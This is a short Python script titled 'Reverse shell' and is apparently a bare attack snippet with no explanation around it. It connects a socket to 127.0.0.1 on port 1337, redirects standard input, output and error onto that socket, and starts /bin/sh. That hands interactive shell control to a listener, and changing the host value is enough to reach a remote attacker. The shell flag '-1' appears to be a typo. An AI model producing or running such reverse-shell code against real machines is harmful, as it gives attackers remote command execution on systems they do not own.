# Reverse shell


import socket
import subprocess # to launch a reverse shell
import os

host = "127.0.0.1"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,1337))
# to send standard output, input, error
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

subprocess.call(["/bin/sh","-1"])


